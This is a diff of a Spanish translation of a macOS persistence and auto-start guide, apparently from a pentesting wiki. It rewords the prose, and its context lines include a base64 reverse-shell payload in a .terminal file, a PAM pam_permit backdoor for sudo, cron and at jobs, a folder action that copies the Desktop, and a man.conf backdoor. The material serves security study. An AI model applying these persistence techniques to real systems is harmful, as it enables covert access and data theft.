@@ -20,13 +20,13 @@ Esta sección se basa en gran medida en la serie de blogs [**Beyond the good ol'
 ## Sandbox Bypass
 
 {% hint style="success" %}
-Aquí puedes encontrar ubicaciones de inicio útiles para **sandbox bypass** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando** una **acción muy** **común**, una **cantidad determinada de tiempo** o una **acción que normalmente puedes realizar** desde dentro de un sandbox sin necesidad de permisos de root.
+Aquí puedes encontrar ubicaciones de inicio útiles para **sandbox bypass** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando** una **acción** muy **común**, una **cantidad determinada de tiempo** o una **acción que normalmente puedes realizar** desde dentro de un sandbox sin necesidad de permisos de root.
 {% endhint %}
 
 ### Launchd
 
 * Útil para el bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
-* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ubicaciones
 
@@ -93,7 +93,7 @@ Hay casos en los que un **agente necesita ser ejecutado antes de que el usuario 
 Los nuevos archivos de configuración de Daemons o Agents serán **cargados después del próximo reinicio o usando** `launchctl load <target.plist>` También es **posible cargar archivos .plist sin esa extensión** con `launchctl -F <file>` (sin embargo, esos archivos plist no se cargarán automáticamente después del reinicio).\
 También es posible **descargar** con `launchctl unload <target.plist>` (el proceso señalado por él será terminado),
 
-Para **asegurar** que no haya **nada** (como una anulación) **impidiendo** que un **Agente** o **Daemon** **se ejecute**, ejecuta: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+Para **asegurar** que no hay **nada** (como una anulación) **previniendo** que un **Agente** o **Daemon** **se ejecute**, ejecuta: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 {% endhint %}
 
 Lista todos los agentes y daemons cargados por el usuario actual:
@@ -206,7 +206,7 @@ Para **agregar una aplicación a esta lista** puedes usar:
 ```
 ### Preferencias del Terminal
 
-* Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Eludir TCC: [✅](https://emojipedia.org/check-mark-button)
 * El uso del Terminal tiene permisos de FDA del usuario que lo utiliza
 
@@ -239,7 +239,7 @@ Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.
 }
 [...]
 ```
-Así que, si el plist de las preferencias del terminal en el sistema pudiera ser sobrescrito, entonces la funcionalidad **`open`** puede ser utilizada para **abrir el terminal y ese comando será ejecutado**.
+Así que, si el plist de las preferencias del terminal en el sistema pudiera ser sobrescrito, entonces la funcionalidad **`open`** se puede usar para **abrir el terminal y ese comando será ejecutado**.
 
 Puedes agregar esto desde la línea de comandos con:
 
@@ -297,7 +297,7 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Podrías también usar las extensiones **`.command`**, **`.tool**, con contenido de scripts de shell regulares y también se abrirán en Terminal.
+Podrías usar también las extensiones **`.command`**, **`.tool**, con contenido de scripts de shell regulares y también se abrirán con Terminal.
 
 {% hint style="danger" %}
 Si Terminal tiene **Acceso Completo al Disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).
@@ -350,12 +350,12 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbi
 
 Los plugins de QuickLook pueden ejecutarse cuando **activas la vista previa de un archivo** (presiona la barra espaciadora con el archivo seleccionado en Finder) y un **plugin que soporte ese tipo de archivo** está instalado.
 
-Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubicaciones anteriores para cargarlo y luego ir a un archivo soportado y presionar espacio para activarlo.
+Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubicaciones anteriores para cargarlo y luego ir a un archivo compatible y presionar espacio para activarlo.
 
 ### ~~Hooks de Inicio/Cierre de Sesión~~
 
 {% hint style="danger" %}
-Esto no funcionó para mí, ni con el LoginHook del usuario ni con el LogoutHook de root
+Esto no funcionó para mí, ni con el LoginHook del usuario ni con el LogoutHook de root.
 {% endhint %}
 
 **Escritura**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
@@ -400,7 +400,7 @@ El usuario root se almacena en **`/private/var/root/Library/Preferences/com.appl
 ## Bypass de Sandbox Condicional
 
 {% hint style="success" %}
-Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no muy comunes** como programas específicos **instalados, acciones de usuario "poco comunes"** o entornos.
+Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no muy comunes** como programas **específicos instalados, acciones de usuario "poco comunes"** o entornos.
 {% endhint %}
 
 ### Cron
@@ -433,7 +433,7 @@ ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
 Ahí puedes encontrar los **cron** **jobs** regulares, los **at** **jobs** (no muy utilizados) y los **periodic** **jobs** (principalmente utilizados para limpiar archivos temporales). Los trabajos periódicos diarios se pueden ejecutar, por ejemplo, con: `periodic daily`.
 
-Para agregar un **user cronjob programatically** es posible usar:
+Para agregar un **user cronjob programáticamente** es posible usar:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -534,7 +534,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbi
 #### Ubicación
 
 * **`~/Library/Application\ Support/xbar/plugins/`**
-* **Disparador**: Una vez que se ejecute xbar
+* **Disparador**: Una vez que xbar se ejecute
 
 #### Descripción
 
@@ -550,7 +550,7 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 **Escritura**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)
 
-* Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Pero Hammerspoon debe estar instalado
 * Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
 * Solicita permisos de Accesibilidad
@@ -582,7 +582,7 @@ EOF
 
 * `~/Library/Application Support/BetterTouchTool/*`
 
-Esta herramienta permite indicar aplicaciones o scripts a ejecutar cuando se presionan algunos atajos. Un atacante podría configurar su propio **atajo y acción a ejecutar en la base de datos** para hacer que ejecute código arbitrario (un atajo podría ser simplemente presionar una tecla).
+Esta herramienta permite indicar aplicaciones o scripts a ejecutar cuando se presionan algunos atajos. Un atacante podría configurar su propio **atajo y acción para ejecutar en la base de datos** para hacer que ejecute código arbitrario (un atajo podría ser simplemente presionar una tecla).
 
 ### Alfred
 
@@ -604,7 +604,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbi
 * Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Pero ssh necesita estar habilitado y en uso
 * Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
-* El uso de SSH requiere acceso FDA
+* El uso de SSH requiere acceso a FDA
 
 #### Ubicación
 
@@ -631,7 +631,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbi
 
 * Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Pero necesitas ejecutar `osascript` con argumentos
-* Eludir TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ubicaciones
 
@@ -662,9 +662,9 @@ Los **elementos de inicio de sesión** también pueden indicarse utilizando la A
 
 ### ZIP como Elemento de Inicio de Sesión
 
-(Revisa la sección anterior sobre Elementos de Inicio de Sesión, esto es una extensión)
+(Revisa la sección anterior sobre Elementos de Inicio de Sesión, esta es una extensión)
 
-Si almacenas un archivo **ZIP** como un **Elemento de Inicio de Sesión**, la **`Utilidad de Archivos`** lo abrirá y si el zip fue, por ejemplo, almacenado en **`~/Library`** y contenía la carpeta **`LaunchAgents/file.plist`** con un backdoor, esa carpeta será creada (no lo está por defecto) y el plist será agregado para que la próxima vez que el usuario inicie sesión, el **backdoor indicado en el plist será ejecutado**.
+Si almacenas un archivo **ZIP** como un **Elemento de Inicio de Sesión**, el **`Archive Utility`** lo abrirá y si el zip fue, por ejemplo, almacenado en **`~/Library`** y contenía la carpeta **`LaunchAgents/file.plist`** con un backdoor, esa carpeta será creada (no lo está por defecto) y el plist será agregado para que la próxima vez que el usuario inicie sesión, el **backdoor indicado en el plist será ejecutado**.
 
 Otra opción sería crear los archivos **`.bash_profile`** y **`.zshenv`** dentro del HOME del usuario, así que si la carpeta LaunchAgents ya existe, esta técnica seguiría funcionando.
 
@@ -730,7 +730,7 @@ unset OLDPWD
 echo 11 > /tmp/at.txt
 ```
 {% hint style="warning" %}
-Si las tareas AT no están habilitadas, las tareas creadas no se ejecutarán.
+Si las tareas de AT no están habilitadas, las tareas creadas no se ejecutarán.
 {% endhint %}
 
 Los **archivos de trabajo** se pueden encontrar en `/private/var/at/jobs/`
@@ -756,7 +756,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbi
 Escritura: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
 * Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
-* Pero necesitas poder llamar a `osascript` con argumentos para contactar a **`System Events`** y poder configurar las Acciones de Carpeta
+* Pero necesitas poder llamar a `osascript` con argumentos para contactar a **`System Events`** para poder configurar las Acciones de Carpeta
 * Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
 * Tiene algunos permisos básicos de TCC como Escritorio, Documentos y Descargas
 
@@ -789,7 +789,7 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Para hacer que el script anterior sea utilizable por Folder Actions, compílalo usando:
+Para hacer que el script anterior sea utilizable por las Acciones de Carpeta, compílalo usando:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
@@ -829,7 +829,7 @@ Muévelo a:
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-Luego, abre la aplicación `Folder Actions Setup`, selecciona la **carpeta que te gustaría observar** y selecciona en tu caso **`folder.scpt`** (en mi caso lo llamé output2.scp):
+Luego, abre la aplicación `Folder Actions Setup`, selecciona la **carpeta que te gustaría vigilar** y selecciona en tu caso **`folder.scpt`** (en mi caso lo llamé output2.scp):
 
 <figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
 
@@ -955,7 +955,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.g
 
 #### Descripción y Explotación
 
-**Compila un** bundle **de seleccionador de color** con tu código (podrías usar [**este por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y añade un constructor (como en la [sección de Protector de Pantalla](macos-auto-start-locations.md#screen-saver)) y copia el bundle a `~/Library/ColorPickers`.
+**Compila un seleccionador de color** con tu código (podrías usar [**este por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y añade un constructor (como en la [sección de Protector de Pantalla](macos-auto-start-locations.md#screen-saver)) y copia el paquete a `~/Library/ColorPickers`.
 
 Luego, cuando se active el seleccionador de color, tu código también debería ejecutarse.
 
@@ -1036,7 +1036,7 @@ Timestamp                       (process)[PID]
 Tenga en cuenta que debido a que dentro de los derechos del binario que carga este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puede encontrar **`com.apple.security.app-sandbox`** estará **dentro del sandbox de aplicaciones común**.
 {% endhint %}
 
-Saver code:
+Código del protector de pantalla:
 ```objectivec
 //
 //  ScreenSaverExampleView.m
@@ -1188,7 +1188,7 @@ Además, los plugins predeterminados del sistema siempre tienen prioridad, por l
 Para crear tu propio importador, podrías comenzar con este proyecto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) y luego cambiar el nombre, el **`CFBundleDocumentTypes`** y agregar **`UTImportedTypeDeclarations`** para que soporte la extensión que te gustaría soportar y reflejarlas en **`schema.xml`**.\
 Luego **cambia** el código de la función **`GetMetadataForFile`** para ejecutar tu payload cuando se crea un archivo con la extensión procesada.
 
-Finalmente **construye y copia tu nuevo `.mdimporter`** a una de las ubicaciones anteriores y puedes verificar si se carga **monitoreando los logs** o revisando **`mdimport -L.`**
+Finalmente **compila y copia tu nuevo `.mdimporter`** a una de las ubicaciones anteriores y puedes verificar si se carga **monitoreando los logs** o revisando **`mdimport -L.`**
 
 ### ~~Panel de Preferencias~~
 
@@ -1310,7 +1310,7 @@ Una técnica de persistencia/escalada de privilegios que abusa de PAM es tan fá
 ```bash
 auth       sufficient     pam_permit.so
 ```
-Así que **se verá** algo como esto:
+Así que se verá **como** algo así:
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1327,7 +1327,7 @@ Y por lo tanto, cualquier intento de usar **`sudo` funcionará**.
 Tenga en cuenta que este directorio está protegido por TCC, por lo que es muy probable que el usuario reciba un aviso pidiendo acceso.
 {% endhint %}
 
-Otro buen ejemplo es su, donde puedes ver que también es posible dar parámetros a los módulos PAM (y también podrías poner una puerta trasera en este archivo):
+Otro buen ejemplo es su, donde se puede ver que también es posible dar parámetros a los módulos PAM (y también podrías poner una puerta trasera en este archivo):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1399,7 +1399,7 @@ Actívelo con:
 ```bash
 security authorize com.asdf.asdf
 ```
-Y luego el **grupo de personal debería tener acceso a sudo** (lee `/etc/sudoers` para confirmar).
+Y luego el **grupo de personal debería tener acceso sudo** (lee `/etc/sudoers` para confirmar).
 
 ### Man.conf
 
@@ -1417,7 +1417,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbi
 
 #### Descripción y Explotación
 
-El archivo de configuración **`/private/etc/man.conf`** indica el binario/script a usar al abrir archivos de documentación de man. Por lo tanto, la ruta al ejecutable podría ser modificada para que cada vez que el usuario use man para leer algunos documentos, se ejecute una puerta trasera.
+El archivo de configuración **`/private/etc/man.conf`** indica el binario/script a usar al abrir archivos de documentación de man. Por lo tanto, la ruta al ejecutable podría ser modificada para que cada vez que el usuario use man para leer alguna documentación, se ejecute una puerta trasera.
 
 Por ejemplo, configurado en **`/private/etc/man.conf`**:
 ```
@@ -1587,7 +1587,7 @@ Es tan complicado instalar kext incluso como root que no consideraré esto para 
 
 #### Ubicación
 
-Para instalar un KEXT como un elemento de inicio, debe ser **instalado en una de las siguientes ubicaciones**:
+Para instalar un KEXT como un elemento de inicio, debe **instalarse en una de las siguientes ubicaciones**:
 
 * `/System/Library/Extensions`
 * Archivos KEXT integrados en el sistema operativo OS X.
@@ -1615,7 +1615,7 @@ Escritura: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbi
 
 #### Descripción y explotación
 
-Aparentemente, el `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estaba utilizando este binario mientras exponía un servicio XPC... el problema es que el binario no existía, así que podrías colocar algo allí y cuando se llame al servicio XPC, tu binario será llamado.
+Aparentemente, el `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estaba utilizando este binario mientras exponía un servicio XPC... el problema es que el binario no existía, así que podrías colocar algo allí y cuando se llame al servicio XPC, se llamará a tu binario.
 
 Ya no puedo encontrar esto en mi macOS.
 
